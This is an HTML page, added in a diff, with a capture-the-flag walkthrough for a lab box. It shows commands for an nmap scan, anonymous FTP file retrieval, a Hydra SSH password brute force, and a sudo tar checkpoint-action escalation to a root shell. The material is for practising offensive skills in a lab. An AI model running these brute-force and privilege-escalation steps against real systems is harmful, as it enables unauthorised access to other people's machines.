@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture The Flag Walkthrough</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #d1f0ff; /* Mind theme with sky blue color */
+            padding: 20px;
+        }
+        h1, h2, h3 {
+            color: #333; /* Dark grey for headers */
+        }
+        pre {
+            background-color: #f8f8f8; /* Light grey for code blocks */
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>Capture The Flag Walkthrough</h1>
+
+    <h2>Introduction</h2>
+    <p>You boasted about your elite hacker skills in a bar, and now a group of Bounty Hunters challenges you to prove it.</p>
+
+    <h2>Step 1: Network Scanning with NMAP</h2>
+    <pre>
+        nmap -A $IP
+    </pre>
+    <p>We start by scanning the network using NMAP with aggressive mode to gather information about open ports and services.</p>
+
+    <h3>Results:</h3>
+    <pre>
+        [NMAP output here]
+    </pre>
+
+    <h2>Step 2: Exploring FTP</h2>
+    <pre>
+        ftp 10.10.253.164
+    </pre>
+    <p>We connect to the FTP server using the anonymous login credentials obtained from the NMAP scan.</p>
+
+    <h3>Files Found:</h3>
+    <pre>
+        task.txt
+        locks.txt
+    </pre>
+
+    <h2>Step 3: Retrieving Files</h2>
+    <pre>
+        ftp> get task.txt
+        ftp> get locks.txt
+    </pre>
+    <p>We download the files <code>task.txt</code> and <code>locks.txt</code> for further analysis.</p>
+
+    <h2>Step 4: Brute Forcing SSH</h2>
+    <pre>
+        hydra -l lin -P locks.txt 10.10.253.164 ssh
+    </pre>
+    <p>We use Hydra to perform a brute force attack on the SSH server using the username <code>lin</code> and the passwords from <code>locks.txt</code>.</p>
+
+    <h2>Step 5: Escalating Privileges</h2>
+    <pre>
+        sudo -l
+    </pre>
+    <p>We check lin's permissions and find that we can run <code>tar</code> as root.</p>
+
+    <pre>
+        sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+    </pre>
+    <p>We exploit tar to gain root access using GTFOBins.</p>
+
+    <h2>Step 6: Obtaining Root Flag</h2>
+    <pre>
+        locate root.txt
+        cat /root/root.txt
+    </pre>
+    <p>We locate and read the root flag.</p>
+
+    <p>Congratulations! You've completed the Capture The Flag challenge!</p>
+</body>
+</html>
